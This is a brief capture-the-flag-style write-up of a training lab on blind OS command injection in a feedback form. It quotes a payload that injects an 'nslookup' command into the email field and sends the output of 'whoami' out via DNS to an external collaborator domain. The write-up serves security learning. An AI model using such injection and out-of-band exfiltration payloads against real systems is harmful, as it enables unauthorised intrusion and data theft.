*This lab contains a blind OS command injection vulnerability in the feedback function.
The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. *

Submitted a feedback and sent the request from *Proxy* to *Repeater*. 

I decided to inject a payload to perform a DNS lookup and output the contents of `whoami` to the *Collaborator* server. My payload is as such:
`|| nslookup `whoami.`67bxhm1wtd0hs2mjsw8qghrfp6vxjn7c.oastify.com &`
I URL encoded the payload and injected it at each client input, checking the polls in *Collaborator*:
![Screenshot 2024-05-09 at 1.26.38 PM](images/Screenshot%202024-05-09%20at%201.26.38%20PM.png)
Injecting the payload at the `email` input triggered a DNS lookup as seen below, solving the lab!
![Screenshot 2024-05-09 at 1.28.03 PM](images/Screenshot%202024-05-09%20at%201.28.03%20PM.png)
